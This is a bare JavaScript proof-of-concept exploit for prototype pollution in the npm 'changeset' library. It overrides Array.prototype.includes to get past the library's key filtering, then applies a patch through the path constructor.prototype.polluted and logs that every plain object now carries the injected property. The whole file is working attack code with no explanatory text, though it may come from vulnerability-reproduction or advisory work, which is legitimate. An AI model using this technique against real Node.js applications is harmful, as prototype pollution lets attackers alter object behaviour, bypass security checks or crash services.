Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const changeset = require('changeset');
const patch = [{
        type: 'put',
        key: [
            'constructor',
            'prototype',
            'polluted'
        ],
        value: 'yes'
    }];
changeset.apply(patch, {}, true);
console.log({}.polluted);